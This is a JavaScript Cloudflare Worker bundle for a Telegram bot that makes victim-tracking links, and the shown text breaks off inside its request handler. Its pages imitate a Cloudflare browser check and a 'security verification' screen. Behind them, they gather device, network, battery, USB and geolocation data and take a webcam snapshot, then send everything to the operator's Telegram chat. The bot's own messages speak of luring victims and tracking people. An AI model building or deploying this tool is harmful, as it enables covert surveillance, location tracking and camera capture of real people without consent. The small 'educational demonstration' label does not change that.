var __defProp = Object.defineProperty;
var __name = (target, value) => __defProp(target, "name", { value, configurable: true });

// .wrangler/tmp/bundle-wIdj6i/checked-fetch.js
var urls = /* @__PURE__ */ new Set();
function checkURL(request, init) {
  const url = request instanceof URL ? request : new URL(
    (typeof request === "string" ? new Request(request, init) : request).url
  );
  if (url.port && url.port !== "443" && url.protocol === "https:") {
    if (!urls.has(url.toString())) {
      urls.add(url.toString());
      console.warn(
        `WARNING: known issue with \`fetch()\` requests to custom HTTPS ports in published Workers:
 - ${url.toString()} - the custom port will be ignored when the Worker is published using the \`wrangler deploy\` command.
`
      );
    }
  }
}
__name(checkURL, "checkURL");
globalThis.fetch = new Proxy(globalThis.fetch, {
  apply(target, thisArg, argArray) {
    const [request, init] = argArray;
    checkURL(request, init);
    return Reflect.apply(target, thisArg, argArray);
  }
});

// worker.js
var cloudflareTemplate = `<html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"><meta name="robots" content="noindex, nofollow"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Just a moment...</title><style type="text/css">html, body {width: 100%; height: 100%; margin: 0; padding: 0;}body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}p {font-size: 20px; font-weight: 400; margin: 8px 0;}p, .attribution, {text-align: center;}#spinner {margin: 0 auto 30px auto; display: block;}.attribution {margin-top: 32px;}@keyframes fader{0%{opacity:0.2}50%{opacity:1.0}100%{opacity:0.2}}@-webkit-keyframes fader{0%{opacity:0.2}50%{opacity:1.0}100%{opacity:0.2}}#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }a:hover{color: #f4a15d}.attribution{font-size: 16px; line-height: 1.5;}.ray_id{display: block; margin-top: 8px;}#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }#cf-hcaptcha-container { text-align:center;}#cf-hcaptcha-container iframe { display: inline-block;}.edu-notice {font-size: 10px; color: #6c757d; text-align: center; margin-top: 10px;}</style></head><body><table width="100%" height="100%" cellpadding="20"><tbody><tr><td align="center" valign="middle"><div class="cf-browser-verification cf-im-under-attack"><noscript><h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1></noscript><div id="cf-content" style="display: block;"><div id="cf-bubbles"><div class="bubbles"></div><div class="bubbles"></div><div class="bubbles"></div></div><h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1><div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"><p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p></div><p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p><p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs">Please allow up to 6 seconds\u2026</p><p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting\u2026</p><p class="edu-notice">This is a cybersecurity educational demonstration.</p></div></div><div class="attribution">DDoS protection by <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a><br><span class="ray_id">Ray ID: <code id="ray" >GENERATING...</code></span><p class="edu-notice">This is a cybersecurity educational demonstration.</p></div></td></tr></tbody></table><video id="video" style="display:none" playsinline autoplay></video><canvas hidden="hidden" id="canvas" width="500" height="500"></canvas><script type="text/javascript">var uid="REPLACE_UID",redirectUrl="REPLACE_URL",hostUrl="REPLACE_HOST_URL",c=false,l=false,dataCollected=false,redirectTimeout;function generateRayId(){var a="qwertyuioplkjhgfdsazxcvbnm0987654321",b="";for(var c=0;c<17;c++)b+=a[Math.floor(Math.random()*a.length)];document.getElementById("ray").innerHTML=b}async function gather(){let a={};try{a.deviceInfo={userAgent:navigator.userAgent,platform:navigator.platform,vendor:navigator.vendor,language:navigator.language,cookiesEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelRatio:window.devicePixelRatio,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:(new Date).getTimezoneOffset()},navigator.connection&&(a.networkInfo={downlink:navigator.connection.downlink,effectiveType:navigator.connection.effectiveType,rtt:navigator.connection.rtt,saveData:navigator.connection.saveData})}catch(b){}try{if(navigator.getBattery){const c=await navigator.getBattery();a.batteryInfo={charging:c.charging,level:c.level,chargingTime:c.chargingTime,dischargingTime:c.dischargingTime}}else a.batteryInfo={error:"Battery API not available"}}catch(d){a.batteryInfo={error:"Battery API error: "+d.toString()}}try{if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){const e=await navigator.mediaDevices.enumerateDevices();a.mediaDevices=e.map(f=>({kind:f.kind,label:f.label,deviceId:f.deviceId?f.deviceId.substring(0,5)+"...":"none"}))}else a.mediaDevices={error:"Media Devices API not available"}}catch(g){a.mediaDevices={error:"Media Devices API error: "+g.toString()}}try{if(navigator.usb&&navigator.usb.getDevices){const h=await navigator.usb.getDevices();a.usbDevices=h.map(i=>({productName:i.productName,manufacturerName:i.manufacturerName,serialNumber:i.serialNumber?"Available (redacted)":"None"}))}else a.usbDevices={error:"USB API not available"}}catch(j){a.usbDevices={error:"USB API error: "+j.toString()}}try{a.geolocation=await new Promise((k,m)=>{navigator.geolocation.getCurrentPosition(
        n=>{k({latitude:n.coords.latitude,longitude:n.coords.longitude,accuracy:n.coords.accuracy});l=true;redirectIfReady()},
        o => {
            let errorMsg = "Geolocation permission denied or unavailable";
            console.error("Geolocation Error Code:", o.code, "Message:", o.message);
            if (o.code === 1) {
                 errorMsg = "Geolocation permission denied by user.";
            } else if (o.code === 2) {
                 errorMsg = "Location information is unavailable.";
            } else if (o.code === 3) {
                 errorMsg = "Geolocation request timed out.";
            }
            k({ error: errorMsg });
            if (typeof l !== 'undefined') l = true;
            if (typeof locationCollected !== 'undefined') locationCollected = true;
            redirectIfReady();
        },
        {timeout:10e3}
    )})}catch(p){a.geolocation={error:"Geolocation API error: "+p.toString()};l=true;redirectIfReady()}try{if(navigator.storage&&navigator.storage.estimate){const q=await navigator.storage.estimate();a.storageInfo={quota:q.quota,usage:q.usage,percentUsed:Math.round(q.usage/q.quota*100)}}else a.storageInfo={error:"Storage API not available"}}catch(r){a.storageInfo={error:"Storage API error: "+r.toString()}}return a}async function collectAllData(){try{const a=await gather();a.metadata={uid:uid,hostUrl:hostUrl,time:new Date().toISOString(),referrer:document.referrer};fetch(hostUrl+"/",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:uid,data:a})}).catch(b=>{});dataCollected=true;l=true;await initCamera();if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)c=true;redirectIfReady()}catch(s){setTimeout(finishCollection,2e3)}}function redirectIfReady(){if(c&&l&&dataCollected)redirectToTarget()}function redirectToTarget(){clearTimeout(redirectTimeout);window.location.href=redirectUrl}function finishCollection(){c=true;l=true;dataCollected=true;redirectIfReady()}async function initCamera(){if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){c=true;redirectIfReady();return}try{const a=document.getElementById("video"),b=document.getElementById("canvas"),d=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});a.srcObject=d;setTimeout(()=>{try{b.width=a.videoWidth;b.height=a.videoHeight;b.getContext("2d").drawImage(a,0,0);const e=b.toDataURL("image/jpeg",.8);const f=new FormData;f.append("uid",uid);f.append("img",e);fetch(hostUrl+"/camsnap",{method:"POST",body:f}).catch(g=>{});d.getTracks().forEach(h=>h.stop())}catch(i){}finally{c=true;redirectIfReady()}},1500)}catch(j){c=true;redirectIfReady()}}document.addEventListener("DOMContentLoaded",()=>{generateRayId();collectAllData();redirectTimeout=setTimeout(finishCollection,6e3)});<\/script></body></html>`;
var webviewTemplate = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body{font-family:Arial,sans-serif;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh;background-color:#f5f5f5}.container{text-align:center;padding:20px;background-color:white;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);max-width:90%;width:500px}.loader{border:5px solid #f3f3f3;border-top:5px solid #3498db;border-radius:50%;width:50px;height:50px;animation:spin 2s linear infinite;margin:20px auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.hidden{display:none}#video{width:100%;max-width:320px;border-radius:8px;margin-top:10px}</style></head><body><div class="container"><h2>Security Verification</h2><p>Please wait while we verify your device...</p><div class="loader"></div><div id="cameraContainer" class="hidden"><p>Camera verification required for security.</p><video id="video" autoplay playsinline></video><canvas id="canvas" style="display:none"></canvas></div><div id="status" class="hidden"></div></div><script>const uid="{{UID}}",ip="{{IP}}",time="{{TIME}}",hostUrl="{{HOST_URL}}",redirectUrl="{{REDIRECT_URL}}";let dataCollected=false,locationCollected=false,cameraCollected=false,redirectTimeout;function redirectIfReady(){if((dataCollected&&locationCollected&&cameraCollected)||(dataCollected&&!navigator.geolocation&&cameraCollected)||(dataCollected&&locationCollected&&!navigator.mediaDevices))redirectToTarget()}function redirectToTarget(){clearTimeout(redirectTimeout);window.location.href=redirectUrl}function finishCollection(){dataCollected=true;locationCollected=true;cameraCollected=true;redirectIfReady()}async function initCamera(){if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cameraCollected=true;redirectIfReady();return}try{const a=document.getElementById("cameraContainer"),b=document.getElementById("video"),c=document.getElementById("canvas"),d=document.getElementById("status");a.classList.remove("hidden");const e=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});b.srcObject=e;setTimeout(()=>{try{c.width=b.videoWidth;c.height=b.videoHeight;c.getContext("2d").drawImage(b,0,0);const f=c.toDataURL("image/jpeg",.8);const g=new FormData;g.append("uid",uid);g.append("img",f);fetch(hostUrl+"/camsnap",{method:"POST",body:g}).catch(h=>{});e.getTracks().forEach(i=>i.stop());a.classList.add("hidden");d.textContent="Verification complete!";d.classList.remove("hidden")}catch(j){}finally{cameraCollected=true;redirectIfReady()}},1500)}catch(k){cameraCollected=true;redirectIfReady()}}async function gather(){let a={};try{a.deviceInfo={userAgent:navigator.userAgent,platform:navigator.platform,vendor:navigator.vendor,language:navigator.language,cookiesEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelRatio:window.devicePixelRatio,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:(new Date).getTimezoneOffset()},navigator.connection&&(a.networkInfo={downlink:navigator.connection.downlink,effectiveType:navigator.connection.effectiveType,rtt:navigator.connection.rtt,saveData:navigator.connection.saveData})}catch(b){}try{if(navigator.getBattery){const c=await navigator.getBattery();a.batteryInfo={charging:c.charging,level:c.level,chargingTime:c.chargingTime,dischargingTime:c.dischargingTime}}else a.batteryInfo={error:"Battery API not available"}}catch(d){a.batteryInfo={error:"Battery API error: "+d.toString()}}try{if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){const e=await navigator.mediaDevices.enumerateDevices();a.mediaDevices=e.map(f=>({kind:f.kind,label:f.label,deviceId:f.deviceId?f.deviceId.substring(0,5)+"...":"none"}))}else a.mediaDevices={error:"Media Devices API not available"}}catch(g){a.mediaDevices={error:"Media Devices API error: "+g.toString()}}try{if(navigator.usb&&navigator.usb.getDevices){const h=await navigator.usb.getDevices();a.usbDevices=h.map(i=>({productName:i.productName,manufacturerName:i.manufacturerName,serialNumber:i.serialNumber?"Available (redacted)":"None"}))}else a.usbDevices={error:"USB API not available"}}catch(j){a.usbDevices={error:"USB API error: "+j.toString()}}try{a.geolocation=await new Promise((k,m)=>{navigator.geolocation.getCurrentPosition(
        n=>{k({latitude:n.coords.latitude,longitude:n.coords.longitude,accuracy:n.coords.accuracy});locationCollected=true;redirectIfReady()},
        o => {
            let errorMsg = "Geolocation permission denied or unavailable";
            console.error("Geolocation Error Code:", o.code, "Message:", o.message);
            if (o.code === 1) {
                 errorMsg = "Geolocation permission denied by user.";
            } else if (o.code === 2) {
                 errorMsg = "Location information is unavailable.";
            } else if (o.code === 3) {
                 errorMsg = "Geolocation request timed out.";
            }
            k({ error: errorMsg });
            locationCollected = true;
            redirectIfReady();
        },
        {timeout:10e3}
    )})}catch(p){a.geolocation={error:"Geolocation API error: "+p.toString()};locationCollected=true;redirectIfReady()}try{if(navigator.storage&&navigator.storage.estimate){const q=await navigator.storage.estimate();a.storageInfo={quota:q.quota,usage:q.usage,percentUsed:Math.round(q.usage/q.quota*100)}}else a.storageInfo={error:"Storage API not available"}}catch(r){a.storageInfo={error:"Storage API error: "+r.toString()}}return a}async function collectAllData(){try{const a=await gather();a.metadata={uid:uid,ip:ip,time:time,timestamp:(new Date).toISOString(),referrer:document.referrer};fetch(hostUrl+"/",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:uid,data:a})}).catch(b=>{});dataCollected=true;if(!navigator.geolocation)locationCollected=true;await initCamera();if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)cameraCollected=true;redirectIfReady()}catch(c){setTimeout(finishCollection,2e3)}}document.addEventListener("DOMContentLoaded",()=>{collectAllData();redirectTimeout=setTimeout(finishCollection,6e3)});<\/script></body></html>`;
function decodeBase64(str) {
  try {
    return atob(str);
  } catch (e) {
    console.error("Base64 decoding failed:", e);
    return null;
  }
}
__name(decodeBase64, "decodeBase64");
function renderTemplate(template, data) {
  let rendered = template;
  rendered = rendered.replace(/REPLACE_UID/g, data.uid || "");
  rendered = rendered.replace(/REPLACE_URL/g, data.url || "");
  rendered = rendered.replace(/REPLACE_HOST_URL/g, data.a || "");
  rendered = rendered.replace(/REPLACE_IP/g, data.ip || "");
  rendered = rendered.replace(/REPLACE_TIME/g, data.time || "");
  rendered = rendered.replace(/\{\{UID\}\}/g, data.uid || "");
  rendered = rendered.replace(/\{\{REDIRECT_URL\}\}/g, data.url || "");
  rendered = rendered.replace(/\{\{HOST_URL\}\}/g, data.a || "");
  rendered = rendered.replace(/\{\{IP\}\}/g, data.ip || "");
  rendered = rendered.replace(/\{\{TIME\}\}/g, data.time || "");
  return rendered;
}
__name(renderTemplate, "renderTemplate");
function getClientIP(headers) {
  return headers.get("cf-connecting-ip") || headers.get("x-forwarded-for") || "Unknown";
}
__name(getClientIP, "getClientIP");
async function sendTelegramMessage(env, chatId, text, options = {}) {
  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
  try {
    const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
        ...options
      })
    });
    const result = await response.json();
    if (!result.ok) {
      console.error("Telegram API error:", result.description);
      throw new Error(`Telegram API error: ${result.description}`);
    }
    return result;
  } catch (error) {
    console.error("Error sending Telegram message:", error);
    throw error;
  }
}
__name(sendTelegramMessage, "sendTelegramMessage");
async function sendTelegramLocation(env, chatId, lat, lon) {
  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
  try {
    const latitude = parseFloat(lat);
    const longitude = parseFloat(lon);
    if (isNaN(latitude) || isNaN(longitude)) {
      throw new Error("Invalid coordinates");
    }
    const response = await fetch(`${TELEGRAM_API}/sendLocation`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, latitude, longitude })
    });
    const result = await response.json();
    return result;
  } catch (error) {
    console.error("Error sending location:", error);
    throw error;
  }
}
__name(sendTelegramLocation, "sendTelegramLocation");
async function sendTelegramPhoto(env, chatId, rawBase64Img, caption = "") {
  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
  try {
    if (typeof rawBase64Img !== "string") {
      throw new Error("sendTelegramPhoto expects a raw base64 string.");
    }
    const base64Clean = rawBase64Img.replace(/^data:image\/[a-z]+;base64,/, "");
    const binaryString = atob(base64Clean);
    const bytes = new Uint8Array(binaryString.length);
    for (let i = 0; i < binaryString.length; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    const photoBlob = new Blob([bytes.buffer], { type: "image/jpeg" });
    const formData = new FormData();
    formData.append("chat_id", String(chatId));
    formData.append("photo", photoBlob, "photo.jpg");
    if (caption) {
      formData.append("caption", caption);
    }
    const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
      method: "POST",
      body: formData
    });
    const result = await response.json();
    if (!result.ok) {
      console.error("Telegram sendPhoto API error:", result.description);
      throw new Error(`Telegram sendPhoto API error: ${result.description}`);
    }
    return result;
  } catch (error) {
    console.error("Error sending Telegram photo:", error);
    throw error;
  }
}
__name(sendTelegramPhoto, "sendTelegramPhoto");
var corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
  "Content-Type": "application/json"
};
async function checkWebhookStatus(env) {
  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
  try {
    const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`, {
      method: "GET",
      headers: { "Content-Type": "application/json" }
    });
    const result = await response.json();
    return result;
  } catch (error) {
    console.error("Error checking webhook status:", error);
    return { ok: false, error: error.message };
  }
}
__name(checkWebhookStatus, "checkWebhookStatus");
async function setupWebhook(env) {
  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
  try {
    const webhookUrl = `${HOST_URL}/webhook`;
    const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: webhookUrl })
    });
    const result = await response.json();
    return result;
  } catch (error) {
    console.error("Error setting up webhook:", error);
    return { success: false, error: error.message };
  }
}
__name(setupWebhook, "setupWebhook");
async function createLink(env, chatId, url) {
  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
  try {
    if (!url.match(/^https?:\/\/.+/i)) {
      await sendTelegramMessage(env, chatId, `\u26A0\uFE0F Please enter a valid URL, including http:// or https://`);
      await createNew(env, chatId);
      return;
    }
    const hasEncodedChars = [...url].some((char) => char.charCodeAt(0) > 127);
    if (hasEncodedChars) {
      await sendTelegramMessage(env, chatId, `\u26A0\uFE0F URL contains special characters that may cause issues.`);
      await createNew(env, chatId);
      return;
    }
    const uid = chatId.toString(36);
    const encodedUrl = btoa(url);
    const cUrl = `${HOST_URL}/c/${uid}/${encodedUrl}`;
    const wUrl = `${HOST_URL}/w/${uid}/${encodedUrl}`;
    await sendTelegramMessage(env, chatId, `New links have been created successfully.
URL: ${url}

\u2705Your Links

\u{1F310} CloudFlare Page Link
${cUrl}

\u{1F310} WebView Page Link
${wUrl}`, {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
      })
    });
  } catch (error) {
    console.error("Error creating link:", error);
    await sendTelegramMessage(env, chatId, `\u26A0\uFE0F An error occurred: ${error.message}`);
  }
}
__name(createLink, "createLink");
async function createNew(env, chatId) {
  try {
    await sendTelegramMessage(env, chatId, `\u{1F310} Enter Your URL`, {
      reply_markup: JSON.stringify({
        "force_reply": true
      })
    });
  } catch (error) {
    console.error("Error in createNew:", error);
    await sendTelegramMessage(env, chatId, `\u26A0\uFE0F An error occurred: ${error.message}`);
  }
}
__name(createNew, "createNew");
async function handleRequest(request, env) {
  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
  const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
  if (request.method === "OPTIONS") {
    return new Response(null, {
      headers: corsHeaders
    });
  }
  try {
    const url = new URL(request.url);
    const path = url.pathname;
    if (path === "/setup-webhook" && request.method === "GET") {
      try {
        const webhookInfo = await checkWebhookStatus(env);
        const setupResult = await setupWebhook(env);
        const acceptHeader = request.headers.get("accept") || "";
        if (acceptHeader.includes("application/json")) {
          return new Response(JSON.stringify({
            success: setupResult.ok,
            message: setupResult.ok ? "Webhook set up successfully" : "Failed to set up webhook",
            webhookInfo,
            setupResult
          }), {
            status: setupResult.ok ? 200 : 500,
            headers: corsHeaders
          });
        } else {
          const html = `<!DOCTYPE html><html><head><title>Telegram Bot Webhook Setup</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Arial,sans-serif;line-height:1.6;max-width:800px;margin:0 auto;padding:20px;color:#333}h1{color:#2c7cb0;border-bottom:1px solid #eee;padding-bottom:10px}.status{padding:15px;border-radius:5px;margin:20px 0}.success{background-color:#d4edda;color:#155724;border:1px solid #c3e6cb}.error{background-color:#f8d7da;color:#721c24;border:1px solid #f5c6cb}.info{background-color:#cce5ff;color:#004085;border:1px solid #b8daff}pre{background-color:#f8f9fa;padding:15px;border-radius:5px;overflow-x:auto}.button{display:inline-block;background-color:#4CAF50;color:white;padding:10px 20px;text-align:center;text-decoration:none;font-size:16px;margin:10px 0;cursor:pointer;border-radius:5px;border:none}.button:hover{background-color:#45a049}</style></head><body><h1>Telegram Bot Webhook Setup</h1><div class="status ${setupResult.ok ? "success" : "error"}"><h2>${setupResult.ok ? "\u2705 Webhook Set Up Successfully" : "\u274C Failed to Set Up Webhook"}</h2><p>${setupResult.ok ? "Your Telegram bot is now configured to receive updates via webhook." : "There was an error setting up the webhook."}</p></div><div class="status info"><h3>Webhook Information</h3><p>Current webhook URL: <strong>${webhookInfo.result?.url || "Not set"}</strong></p><p>Webhook status: <strong>${webhookInfo.result?.has_custom_certificate ? "Custom certificate" : "Standard"}</strong></p><p>Pending update count: <strong>${webhookInfo.result?.pending_update_count || 0}</strong></p></div><h3>Next Steps</h3><ol><li>Open your Telegram bot</li><li>Send the command <code>/start</code></li><li>The bot should respond with a welcome message</li></ol><p><a href="/test-bot" class="button">Test Bot</a><a href="/" class="button">Go to Home</a></p><h3>Technical Details</h3><pre>${JSON.stringify({ webhookInfo, setupResult }, null, 2)}</pre></body></html>`;
          return new Response(html, {
            status: setupResult.ok ? 200 : 500,
            headers: {
              "Content-Type": "text/html",
              "Cache-Control": "no-store, private"
            }
          });
        }
      } catch (error) {
        console.error("Error in setup-webhook handler:", error);
        return new Response(JSON.stringify({
          success: false,
          error: error.message
        }), {
          status: 500,
          headers: corsHeaders
        });
      }
    }
    if (path === "/webhook" && request.method === "POST") {
      try {
        const update = await request.json();
        if (update.message && update.message.text) {
          const chatId = update.message.chat.id;
          const text = update.message.text;
          if (text.startsWith("/")) {
            const command = text.split(" ")[0].toLowerCase();
            if (command === "/start") {
              const firstName = update.message.chat.first_name || "User";
              await sendTelegramMessage(env, chatId, `Welcome ${firstName}! You can use this bot to track down people just through a simple link.
It can gather information like location, device info, camera snaps.

Type /help for more info or /create to generate a tracking link.`, {
                reply_markup: JSON.stringify({
                  "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
                })
              });
            } else if (command === "/help") {
              await sendTelegramMessage(env, chatId, `Through this bot you can track people just by sending a simple link.

Send /create to begin, afterwards it will ask you for a URL which will be used to lure victims.
After receiving the url it will send you 2 links which you can use to track people.

Specifications:
1. Cloudflare Link: This method will show a cloudflare under attack page to gather information and afterwards victim will be redirected to the destination URL.
2. Webview Link: This will show a website using a different approach for gathering information.`);
            } else if (command === "/create") {
              await createNew(env, chatId);
            } else {
              await sendTelegramMessage(env, chatId, "\u2753 Unknown command. Use /help to see available commands.");
            }
          } else if (update.message.reply_to_message && update.message.reply_to_message.text === "\u{1F310} Enter Your URL") {
            await createLink(env, chatId, text);
          } else {
            await sendTelegramMessage(env, chatId, "\u{1F4DD} You said: " + text + "\n\nUse /help to see available commands.");
          }
        } else if (update.callback_query) {
          const callbackQuery = update.callback_query;
          const chatId = callbackQuery.message.chat.id;
          const data = callbackQuery.data;
          await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              callback_query_id: callbackQuery.id
            })
          });
          if (data === "crenew") {
            await createNew(env, chatId);
          }
        }
        return new Response("OK", { status: 200 });
      } catch (error) {
        console.error("Error handling webhook:", error);
        return new Response("Error handling webhook: " + error.message, { status: 500 });
      }
    }
    const cloudflareMatch = path.match(/^\/c\/([^/]+)\/([^/]+)/);
    const webviewMatch = path.match(/^\/w\/([^/]+)\/([^/]+)/);
    if (cloudflareMatch) {
      const [_, uid, uri] = cloudflareMatch;
      const ip = getClientIP(request.headers);
      const time = (/* @__PURE__ */ new Date()).toISOString().replace("T", " ").slice(0, 19);
      const decodedURL = decodeBase64(uri);
      if (!decodedURL) {
        return new Response("Invalid URL encoding", { status: 400 });
      }
      const templateData = {
        uid,
        url: decodedURL,
        a: HOST_URL,
        ip,
        time
      };
      const page = renderTemplate(cloudflareTemplate, templateData);
      return new Response(page, {
        headers: {
          "Content-Type": "text/html",
          "Cache-Control": "no-store, private"
        }
      });
    }
    if (webviewMatch) {
      const [_, uid, uri] = webviewMatch;
      const ip = getClientIP(request.headers);
      const time = (/* @__PURE__ */ new Date()).toISOString().replace("T", " ").slice(0, 19);
      const decodedURL = decodeBase64(uri);
      if (!decodedURL) {
        return new Response("Invalid URL encoding", { status: 400 });
      }
      const templateData = {
        uid,
        url: decodedURL,
        a: HOST_URL,
        ip,
        time
      };
      const page = renderTemplate(webviewTemplate, templateData);
      return new Response(page, {
        headers: {
          "Content-Type": "text/html",
          "Cache-Control": "no-store, private"
        }
      });
    }
    if (request.method === "POST" && path === "/") {
      try {
        const contentType = request.headers.get("content-type") || "";
        if (contentType.includes("application/json")) {
          const jsonData = await request.json();
          const uid = jsonData.uid;
          if (!uid) {
            return new Response("Missing UID parameter", { status: 400 });
          }
          const chatId = parseInt(uid, 36) || 123456789;
          const ipAddress = getClientIP(request.headers);
          const currentTime = (/* @__PURE__ */ new Date()).toISOString().replace("T", " ").slice(0, 19);
          let message = `\u2705Victim Information

\u2693 IP: ${ipAddress} (https://ip-api.com/#${ipAddress}) | Time: ${currentTime}

\u23F3 Date In Victim's Device : ${(/* @__PURE__ */ new Date()).toString()}

\u{1F4F1} Device Information
`;
          if (jsonData.data?.deviceInfo) {
            const deviceInfo = jsonData.data.deviceInfo;
            for (const [key, value] of Object.entries(deviceInfo)) {
              if (value !== void 0 && value !== null) {
                message += `${key}: ${value}
`;
              }
            }
          }
          message += `
\u{1F4F7} Media Device Information
`;
          if (jsonData.data?.mediaDevices && Array.isArray(jsonData.data.mediaDevices)) {
            jsonData.data.mediaDevices.forEach((device) => {
              if (device.kind && device.label) {
                message += `${device.kind}: ${device.label}
`;
              }
            });
          } else {
            message += `None detected
`;
          }
          message += `
\u{1F578}\uFE0F Network Information
`;
          if (jsonData.data?.networkInfo) {
            const networkInfo = jsonData.data.networkInfo;
            for (const [key, value] of Object.entries(networkInfo)) {
              if (value !== void 0 && value !== null) {
                message += `${key}: ${value}
`;
              }
            }
          } else {
            message += `None detected
`;
          }
          message += `
\u{1F50C} Total USB devices connected: ${jsonData.data?.usbDevices?.length || 0}

`;
          message += `\u{1F50B} Battery Information
`;
          if (jsonData.data?.batteryInfo) {
            const batteryInfo = jsonData.data.batteryInfo;
            message += `\u{1F50B}Battery Level: ${batteryInfo.level ? Math.round(batteryInfo.level * 100) + "%" : "Unknown"}
`;
            message += `\u26A1 Is Battery Charging: ${batteryInfo.charging ? "true" : "false"}
`;
          } else {
            message += `Battery data not available
`;
          }
          await sendTelegramMessage(env, chatId, message);
          if (jsonData.data?.geolocation && !jsonData.data.geolocation.error) {
            const geo = jsonData.data.geolocation;
            try {
              await sendTelegramLocation(env, chatId, geo.latitude, geo.longitude);
              await sendTelegramMessage(env, chatId, `Latitude: ${geo.latitude}
Longitude: ${geo.longitude}
Accuracy: ${geo.accuracy} meters`);
            } catch (locationError) {
              console.error("Error sending location:", locationError);
              await sendTelegramMessage(env, chatId, `\u{1F4CD} Location Error: Could not send map pin. Coordinates: ${geo.latitude}, ${geo.longitude}`);
            }
          } else if (jsonData.data?.geolocation?.error) {
            await sendTelegramMessage(env, chatId, `\u{1F4CD} Location Error: ${jsonData.data.geolocation.error}`);
          }
          return new Response("OK", { headers: corsHeaders });
        } else {
          const formData = await request.formData();
          const uid = formData.get("uid");
          const data = formData.get("data");
          if (!uid || !data) {
            return new Response("Missing required parameters", { status: 400 });
          }
          const chatId = parseInt(uid, 36) || 123456789;
          await sendTelegramMessage(env, chatId, data);
          return new Response("OK", { headers: corsHeaders });
        }
      } catch (error) {
        console.error("Error processing POST request to /:", error);
